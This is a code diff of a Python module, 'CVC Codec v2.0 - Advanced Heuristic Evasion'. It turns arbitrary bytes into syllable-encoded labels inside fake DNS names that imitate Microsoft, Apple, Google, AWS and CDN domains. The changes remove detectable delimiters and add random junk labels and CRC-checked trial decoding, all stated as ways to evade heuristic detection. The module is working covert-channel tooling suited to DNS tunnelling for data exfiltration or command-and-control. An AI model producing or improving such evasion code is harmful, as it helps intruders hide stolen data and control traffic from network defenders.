@@ -1,47 +1,95 @@
+"""
+CVC Codec v2.0 - Advanced Heuristic Evasion
+============================================
+Features:
+- CRC16 checksum for payload validation (trial-and-error decoding)
+- NO static delimiters (xx removed completely)
+- Variable payload position in templates
+- Junk label padding for variable packet length
+- Realistic DNS template patterns
+"""
 import random
 import string
+import struct
 
 # --- CVC Constants ---
 C_START = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'z']
 VOWELS = ['a', 'e', 'i', 'o', 'u', 'y']
 C_END = ['b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'x', 'z']
 
-# --- SAFE Templates ---
-# CRITICAL: All template words must NOT match CVC pattern!
-# Safe patterns:
-#   - Words starting with vowels (a,e,i,o,u,y) -> first char not in C_START
-#   - Words with consecutive consonants that break CVC (e.g., 'str', 'cdn')
-#   - Single/two letter words
-# Data delimiter: 'xx' marks start and end of data section for unambiguous parsing
+# --- Realistic DNS Templates (NO DELIMITERS) ---
+# {P} = Payload position, {J} = Junk label
+# Templates mimic real CDN/API/Cloud patterns
 TEMPLATES = [
-    "ip.xx.{0}.xx.eu",           # 'ip','eu' start with vowel -> Safe, 'xx' is delimiter
-    "a1.xx.{0}.xx.io",           # 'a1' starts with vowel -> Safe
-    "id.xx.{0}.xx.us",           # 'id','us' start with vowel -> Safe  
-    "up.xx.{0}.xx.uk",           # 'up','uk' start with vowel -> Safe
-    "e0.xx.{0}.xx.az",           # 'e0','az' start with vowel -> Safe
+    # CDN-style
+    "{P}.cdn.cloudflare.org",
+    "{P}.{J}.akamaihd.org",
+    "assets.{P}.cloudfront.org",
+    "static.{P}.{J}.fastly.org",
+    # API-style 
+    "api.{P}.{J}.aws.org",
+    "{J}.api.{P}.azure.org",
+    "v1.{P}.api.gcp.io",
+    "{P}.services.{J}.cloud",
+    # Analytics-style
+    "track.{P}.{J}.analytics.io",
+    "{J}.pixel.{P}.metrics.org",
+    "events.{P}.telemetry.org",
+    # Update/Download-style
+    "update.{P}.{J}.microsoft.org",
+    "{P}.download.{J}.apple.org",
+    "dl.{J}.{P}.google.org",
+    # Generic subdomains
+    "{P}.{J}.internal.corp",
+    "ns1.{P}.{J}.hosting.org",
+    "{J}.mail.{P}.servers.io",
 ]
 
-# Data section delimiter - used to isolate payload from template noise
-DATA_DELIMITER = 'xx'
+# TLDs and common suffixes that happen to be valid CVC patterns - MUST SKIP!
+# com = c-o-m, net = n-e-t, biz = b-i-z are all valid CVCs but NOT payload!
+TLD_BLACKLIST = {'com', 'net', 'biz', 'gov', 'mil', 'pub', 'top', 'win', 'xyz',
+                  'cdn', 'api', 'web', 'dev', 'app'}
 
-# Words to ignore during decoding (fallback safety net)
-# Includes TLDs, common DNS prefixes, and any template fragments
-# NOTE: Do NOT add valid CVC patterns here! They could be generated as data.
-# 'com' was removed because c-o-m is a valid CVC syllable.
-# 'net' was removed because n-e-t is a valid CVC syllable.
-IGNORE_WORDS = {
-    # TLDs (only non-CVC ones - 'net' removed, it's valid CVC)
-    'org', 'io', 'eu', 'us', 'uk', 'az', 'co',
-    # Common DNS prefixes (non-CVC)
-    'www', 'ftp', 'ns1', 'ns2', 'mail', 'smtp', 'api', 'cdn', 'dns',
-    # Template fragments (all should start with vowel or be non-CVC anyway)
-    'ip', 'a1', 'id', 'up', 'e0', 'v1', 'db',
-    # Delimiter
-    'xx',
-}
+# Characters allowed in junk labels (looks like realistic subdomain parts)
+JUNK_CHARS = string.ascii_lowercase + string.digits
 
-def _value_to_syllable(value_10bit):
-    """Internal: Convert 10-bit integer to CVC syllable"""
+def _generate_junk_label() -> str:
+    """
+    Generate a random junk label for variable packet length.
+    CRITICAL: Must ALWAYS contain digits to prevent accidental valid CVC patterns.
+    If junk happens to be all letters forming valid CVC, it corrupts decoding!
+    """
+    # Generate base length (will add mandatory digits)
+    base_len = random.randint(2, 8)
+    
+    # Generate random letters
+    letters = ''.join(random.choices(string.ascii_lowercase, k=base_len))
+    
+    # ALWAYS insert 2-3 random digits at random positions to break CVC patterns
+    num_digits = random.randint(2, 3)
+    digits = ''.join(random.choices(string.digits, k=num_digits))
+    
+    # Combine and shuffle
+    combined = list(letters + digits)
+    random.shuffle(combined)
+    
+    return ''.join(combined)
+
+def _crc16(data: bytes) -> int:
+    """CRC-16/CCITT-FALSE - Used to validate decoded payloads"""
+    crc = 0xFFFF
+    for byte in data:
+        crc ^= byte << 8
+        for _ in range(8):
+            if crc & 0x8000:
+                crc = (crc << 1) ^ 0x1021
+            else:
+                crc <<= 1
+            crc &= 0xFFFF
+    return crc
+
+def _value_to_syllable(value_10bit: int) -> str:
+    """Convert 10-bit integer to CVC syllable"""
     idx_end = value_10bit % 15
     rem = value_10bit // 15
     idx_vow = rem % 6
@@ -49,26 +97,57 @@ def _value_to_syllable(value_10bit):
     idx_start = rem % 19
     return f"{C_START[idx_start]}{VOWELS[idx_vow]}{C_END[idx_end]}"
 
-def encode_bytes_to_domain(raw_data: bytes) -> str:
-    if not raw_data: return ""
+def _syllable_to_value(syl: str) -> int:
+    """Convert CVC syllable back to 10-bit integer"""
+    idx_start = C_START.index(syl[0])
+    idx_vow = VOWELS.index(syl[1])
+    idx_end = C_END.index(syl[2])
+    return (idx_start * 90) + (idx_vow * 15) + idx_end
+
+def _is_valid_cvc(s: str) -> bool:
+    """Check if a 3-char string is a valid CVC syllable"""
+    if len(s) != 3:
+        return False
+    return s[0] in C_START and s[1] in VOWELS and s[2] in C_END
+
+def _bytes_to_cvc_labels(data: bytes) -> list:
+    """
+    Convert raw bytes to CVC-encoded labels (list of domain parts)
     
-    # Prepend 1-byte length to preserve exact byte count during decode
-    # This handles the bit-alignment padding issue
-    length_byte = bytes([len(raw_data)])
-    data_with_length = length_byte + raw_data
+    Format: [length (1 byte)] + [data]
+    - length allows exact byte boundary recovery
+    - Padding bits are always 0 (deterministic)
+    """
+    if not data:
+        return []
     
-    huge_int = int.from_bytes(data_with_length, 'big')
-    total_bits = len(data_with_length) * 8
-    num_chunks = (total_bits + 9) // 10
+    # Simple format: length byte + data
+    if len(data) > 255:
+        # For data > 255 bytes, use 2-byte length
+        data_with_header = bytes([0xFF, (len(data) >> 8) & 0xFF, len(data) & 0xFF]) + data
+    else:
+        data_with_header = bytes([len(data)]) + data
+    
+    huge_int = int.from_bytes(data_with_header, 'big')
+    total_bits = len(data_with_header) * 8
+    
+    # Pad to multiple of 10 bits (deterministic zeros)
+    padding_bits = (10 - (total_bits % 10)) % 10
+    if padding_bits > 0:
+        huge_int = huge_int << padding_bits  # Pad with zeros
+        total_bits += padding_bits
+    
+    num_chunks = total_bits // 10
     
     cvc_list = []
     for _ in range(num_chunks):
-        chunk_val = huge_int & 0x3FF 
+        chunk_val = huge_int & 0x3FF
         cvc_list.append(_value_to_syllable(chunk_val))
         huge_int >>= 10
-        
+    
     cvc_list.reverse()
     
+    # Group into labels (3 syllables per label = 9 chars)
     labels = []
     current_group = ""
     for i, cvc in enumerate(cvc_list):
@@ -78,105 +157,205 @@ def encode_bytes_to_domain(raw_data: bytes) -> str:
             current_group = ""
     if current_group:
         labels.append(current_group)
-        
-    domain_core = ".".join(labels)
-    template = random.choice(TEMPLATES)
-    try:
-        domain_name = template.format(domain_core)
-    except:
-        # Safe fallback: 'a0' and 'io' don't match CVC pattern
-        domain_name = f"a0.xx.{domain_core}.xx.io"
-
-    # Debug: log long domains
-    if len(labels) > 8:
-        print(f"[ENCODE DEBUG] {len(raw_data)} bytes -> {len(cvc_list)} syllables -> {len(labels)} labels")
-        print(f"[ENCODE DEBUG] domain: {domain_name}")
-
-    return domain_name
-
-# Alias
-encode_packet_to_domain = encode_bytes_to_domain
-
-def _is_valid_cvc(s: str) -> bool:
-    """Check if a 3-char string is a valid CVC syllable."""
-    if len(s) != 3:
-        return False
-    return s[0] in C_START and s[1] in VOWELS and s[2] in C_END
-
-
-def _extract_data_between_delimiters(parts: list) -> list:
-    """
-    Extract only the parts between 'xx' delimiters.
-    This isolates the actual data from template noise.
-    """
-    try:
-        first_xx = parts.index(DATA_DELIMITER)
-        last_xx = len(parts) - 1 - parts[::-1].index(DATA_DELIMITER)
-        if first_xx < last_xx:
-            return parts[first_xx + 1 : last_xx]
-    except ValueError:
-        pass
-    # Fallback: return all parts if delimiters not found
-    return parts
-
-
-def decode_domain_to_bytes(domain_string: str) -> bytes:
-    """
-    Decodes a CVC domain back to bytes.
-    Uses delimiter-based parsing to isolate data from template noise.
-    """
-    clean_parts = domain_string.lower().split('.')
     
-    # Step 1: Extract data section between delimiters
-    data_parts = _extract_data_between_delimiters(clean_parts)
+    return labels
+
+def _cvc_labels_to_bytes(labels: list, debug=False) -> bytes:
+    """
+    Convert CVC-encoded labels back to raw bytes.
     
+    Format: [length (1 byte)] + [data]
+    Or for data > 255: [0xFF, length_hi, length_lo] + [data]
+    """
     syllables = []
     
-    for part in data_parts:
-        # Skip ignored words (safety net)
-        if part in IGNORE_WORDS:
-            continue
-        
-        # Skip parts that aren't multiples of 3 (can't contain complete CVCs)
+    for part in labels:
         if len(part) == 0 or len(part) % 3 != 0:
             continue
-            
-        # Extract CVC syllables from this part
         for i in range(0, len(part), 3):
             sub = part[i:i+3]
-            if _is_valid_cvc(sub) and sub not in IGNORE_WORDS:
+            if _is_valid_cvc(sub):
                 syllables.append(sub)
     
     if not syllables:
         return b""
-
-    # Reconstruct the integer from syllables
-    # Syllables are in MSB-first order (encoder reversed them), so process left-to-right
-    huge_int = 0
     
-    for syl in syllables:  # NO reverse - domain order is already MSB first
+    # Reconstruct the big integer from syllables
+    huge_int = 0
+    for syl in syllables:
         try:
-            idx_start = C_START.index(syl[0])
-            idx_vow = VOWELS.index(syl[1])
-            idx_end = C_END.index(syl[2])
-            val_10bit = (idx_start * 90) + (idx_vow * 15) + idx_end
+            val_10bit = _syllable_to_value(syl)
             huge_int = (huge_int << 10) | val_10bit
         except ValueError:
-            continue 
-
-    # Convert integer to bytes - use minimum bytes needed (no padding)
+            continue
+    
     if huge_int == 0:
         return b""
     
-    # Calculate minimum bytes needed for the integer
-    byte_length = (huge_int.bit_length() + 7) // 8
-    decoded_with_length = huge_int.to_bytes(byte_length, 'big')
+    # Calculate number of syllables and expected bits
+    num_syllables = len(syllables)
+    total_encoded_bits = num_syllables * 10
     
-    # Extract length prefix and return exact original data
-    if len(decoded_with_length) < 1:
+    # Try each possible padding amount (0-9)
+    for padding_bits in range(10):
+        test_int = huge_int >> padding_bits
+        test_byte_len = (total_encoded_bits - padding_bits) // 8
+        
+        if test_byte_len < 1:
+            continue
+        
+        try:
+            test_bytes = test_int.to_bytes(test_byte_len, 'big')
+        except OverflowError:
+            continue
+        
+        if len(test_bytes) < 1:
+            continue
+        
+        # Check if extended length format (first byte = 0xFF)
+        if test_bytes[0] == 0xFF and len(test_bytes) >= 3:
+            original_length = (test_bytes[1] << 8) | test_bytes[2]
+            header_size = 3
+        else:
+            original_length = test_bytes[0]
+            header_size = 1
+        
+        expected_total = header_size + original_length
+        
+        # Validate: expected_total should match test_byte_len
+        if expected_total == test_byte_len and original_length > 0 and original_length <= 1000:
+            # Verify padding calculation matches
+            original_bits = expected_total * 8
+            expected_padding = (10 - (original_bits % 10)) % 10
+            if expected_padding == padding_bits:
+                return test_bytes[header_size:header_size + original_length]
+    
+    # Fallback: try using bit_length for byte count
+    byte_length = (huge_int.bit_length() + 7) // 8
+    if byte_length < 1:
         return b""
     
-    original_length = decoded_with_length[0]
-    original_data = decoded_with_length[1:1 + original_length]
+    try:
+        decoded = huge_int.to_bytes(byte_length, 'big')
+    except OverflowError:
+        return b""
     
-    return original_data
+    if len(decoded) >= 1:
+        if decoded[0] == 0xFF and len(decoded) >= 3:
+            original_length = (decoded[1] << 8) | decoded[2]
+            if 3 + original_length <= len(decoded):
+                return decoded[3:3 + original_length]
+        else:
+            original_length = decoded[0]
+            if 1 + original_length <= len(decoded):
+                return decoded[1:1 + original_length]
+    
+    return b""
+
+
+def encode_bytes_to_domain(raw_data: bytes) -> str:
+    """
+    Encode bytes to a realistic-looking DNS domain name.
+    
+    Format: [CRC16 (2 bytes)] + [raw_data]
+    The CRC allows the decoder to identify valid payload via trial-and-error.
+    """
+    if not raw_data:
+        return ""
+    
+    # Prepend CRC16 checksum for payload validation
+    crc = _crc16(raw_data)
+    payload_with_crc = struct.pack('!H', crc) + raw_data  # 2 bytes CRC + data
+    
+    # Convert to CVC labels
+    cvc_labels = _bytes_to_cvc_labels(payload_with_crc)
+    
+    if not cvc_labels:
+        return ""
+    
+    # Join CVC labels with dots to form payload subdomain
+    payload_str = ".".join(cvc_labels)
+    
+    # Generate junk label for variable packet length
+    junk = _generate_junk_label()
+    
+    # Pick random template and fill in payload/junk
+    template = random.choice(TEMPLATES)
+    
+    try:
+        domain = template.replace("{P}", payload_str).replace("{J}", junk)
+    except Exception:
+        # Fallback if template is malformed
+        domain = f"{payload_str}.{junk}.example.com"
+    
+    return domain
+
+
+# Alias for backwards compatibility
+encode_packet_to_domain = encode_bytes_to_domain
+
+
+def decode_domain_to_bytes(domain_string: str, debug=False) -> bytes:
+    """
+    Decode a DNS domain name back to raw bytes.
+    
+    Strategy:
+    1. Split domain into labels
+    2. Collect ALL labels that are pure CVC (no digits, all triplets valid)
+    3. Decode and verify CRC16
+    """
+    parts = domain_string.lower().rstrip('.').split('.')
+    
+    if debug:
+        print(f"[DECODE DEBUG] Domain parts: {parts}")
+    
+    # Collect all pure CVC labels (skip junk with digits, skip non-CVC)
+    cvc_labels = []
+    for label in parts:
+        # Skip blacklisted TLDs
+        if label in TLD_BLACKLIST:
+            continue
+        
+        # Skip labels containing ANY digit (that's the junk label)
+        if any(c.isdigit() for c in label):
+            continue
+        
+        # Must be non-empty and length divisible by 3
+        if len(label) == 0 or len(label) % 3 != 0:
+            continue
+        
+        # ALL triplets must be valid CVC
+        all_valid = True
+        for i in range(0, len(label), 3):
+            if not _is_valid_cvc(label[i:i+3]):
+                all_valid = False
+                break
+        
+        if all_valid:
+            cvc_labels.append(label)
+    
+    if not cvc_labels:
+        return b""
+    
+    # Decode CVC labels to bytes
+    decoded = _cvc_labels_to_bytes(cvc_labels, debug=debug)
+    
+    if len(decoded) < 3:  # Minimum: 2 bytes CRC + 1 byte data
+        return b""
+    
+    # Verify CRC16
+    crc_received = struct.unpack('!H', decoded[:2])[0]
+    data = decoded[2:]
+    crc_calculated = _crc16(data)
+    
+    if crc_received == crc_calculated:
+        return data
+    
+    return b""
+
+
+def decode_domain_to_bytes_fast(domain_string: str, debug=False) -> bytes:
+    """
+    Alias for decode_domain_to_bytes for backwards compatibility.
+    """
+    return decode_domain_to_bytes(domain_string, debug=debug)
